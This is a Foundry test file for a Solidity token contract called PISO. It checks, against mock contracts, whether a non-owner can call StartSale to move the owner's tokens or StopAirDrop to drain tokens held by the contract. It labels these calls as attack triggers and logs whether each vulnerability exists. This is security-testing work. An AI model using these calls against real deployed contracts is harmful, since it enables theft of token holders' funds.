// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PISO.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1234);
    }
}

contract MockRouter {
    MockFactory public factoryContract;
    address public weth;
    
    constructor() {
        factoryContract = new MockFactory();
        weth = address(0xC0FFEE);
    }
    
    function factory() external view returns (address) {
        return address(factoryContract);
    }
    
    function WETH() external view returns (address) {
        return weth;
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    
    constructor(uint256 initialSupply) {
        balanceOf[msg.sender] = initialSupply;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PISO_PrivilegeEscalation_Test is Test {
    PISO public piso;
    MockRouter public mockRouter;
    MockERC20 public mockToken;
    
    address owner = address(this);
    address nonOwner = address(0x123);
    address firstRecipient = address(0x1);
    address secondRecipient = address(0x2);
    address thirdRecipient = address(0x3);
    
    uint256 constant initialSupply = 1_000_000 * 1e18;
    uint256 tokensPerRecipient = 1 * 1e18;

    function setUp() public {
        // Initialize mock router
        mockRouter = new MockRouter();
        
        // Deploy PISO token with mock router
        piso = new PISO(address(mockRouter));
        
        // ACTIVATE TRADING HERE - CRITICAL FIX
        vm.prank(owner);
        piso.tradingStatus(true);
        
        // Deploy mock ERC20 token
        mockToken = new MockERC20(initialSupply);
        
        // Transfer mock tokens to PISO contract
        uint256 transferAmount = 10_000 * 1e18;
        mockToken.transfer(address(piso), transferAmount);

        // Transfer tokens to nonOwner for testing
        vm.prank(owner);
        piso.transfer(nonOwner, tokensPerRecipient);
    }
    
    function testStartSalePrivilege() public {
        // Create minimal recipients array
        address[] memory recipients = new address[](1);
        recipients[0] = firstRecipient;
        
        // BEFORE TRIGGER STATE
        console.log("--- BEFORE-Trigger ---");
        uint256 ownerBalanceBefore = piso.balanceOf(owner);
        uint256 nonOwnerBalanceBefore = piso.balanceOf(nonOwner);
        uint256 recipientBalanceBefore = piso.balanceOf(firstRecipient);
        console.log("Owner balance:", ownerBalanceBefore);
        console.log("NonOwner balance:", nonOwnerBalanceBefore);
        console.log("Recipient balance:", recipientBalanceBefore);
        
        // ATTACK TRIGGER
        console.log("--- Trigger: nonOwner calls StartSale ---");
        vm.prank(nonOwner);
        piso.StartSale(recipients, tokensPerRecipient);
        
        // AFTER TRIGGER STATE
        console.log("--- AFTER-Trigger ---");
        uint256 ownerBalanceAfter = piso.balanceOf(owner);
        uint256 nonOwnerBalanceAfter = piso.balanceOf(nonOwner);
        uint256 recipientBalanceAfter = piso.balanceOf(firstRecipient);
        console.log("Owner balance:", ownerBalanceAfter);
        console.log("NonOwner balance:", nonOwnerBalanceAfter);
        console.log("Recipient balance:", recipientBalanceAfter);
        
        // DIFFERENTIAL VERIFICATION
        uint256 ownerLoss = ownerBalanceBefore - ownerBalanceAfter;
        uint256 recipientGain = recipientBalanceAfter - recipientBalanceBefore;
        
        console.log("Owner token loss:", ownerLoss);
        console.log("Recipient token gain:", recipientGain);
        
        // FINAL VERDICT
        if (ownerLoss == tokensPerRecipient && recipientGain == tokensPerRecipient) {
            console.log("Vulnerability Exists: Non-owner transferred OWNER tokens to recipient");
        } else if (nonOwnerBalanceBefore - nonOwnerBalanceAfter == tokensPerRecipient) {
            console.log("Vulnerability not Exist: Non-owner transferred OWN tokens normally");
        } else {
            console.log("Unexpected token transfer behavior");
        }
    }
    
    function testStopAirDropPrivilege() public {
        // BEFORE TRIGGER STATE
        console.log("--- BEFORE-Trigger ---");
        uint256 pisoBalanceBefore = mockToken.balanceOf(address(piso));
        uint256 recipientBalanceBefore = mockToken.balanceOf(secondRecipient);
        console.log("Contract token balance:", pisoBalanceBefore);
        console.log("Recipient token balance:", recipientBalanceBefore);
        
        uint256 transferAmount = pisoBalanceBefore / 2;
        
        // ATTACK TRIGGER
        console.log("--- Trigger: nonOwner calls StopAirDrop ---");
        vm.prank(nonOwner);
        vm.expectRevert();
        piso.StopAirDrop(address(mockToken), secondRecipient, transferAmount);
        
        // AFTER TRIGGER STATE
        console.log("--- AFTER-Trigger ---");
        uint256 pisoBalanceAfter = mockToken.balanceOf(address(piso));
        uint256 recipientBalanceAfter = mockToken.balanceOf(secondRecipient);
        console.log("Contract token balance:", pisoBalanceAfter);
        console.log("Recipient token balance:", recipientBalanceAfter);
        
        // DIFFERENTIAL VERIFICATION
        bool balanceUnchanged = (pisoBalanceAfter == pisoBalanceBefore) && 
                               (recipientBalanceAfter == recipientBalanceBefore);
        
        console.log("Balances unchanged:", balanceUnchanged ? "YES" : "NO");
        
        // FINAL VERDICT
        if (balanceUnchanged) {
            console.log("Vulnerability not Exist: StopAirDrop access control working");
        } else {
            console.log("Vulnerability Exists: Non-owner drained contract funds");
        }
    }
}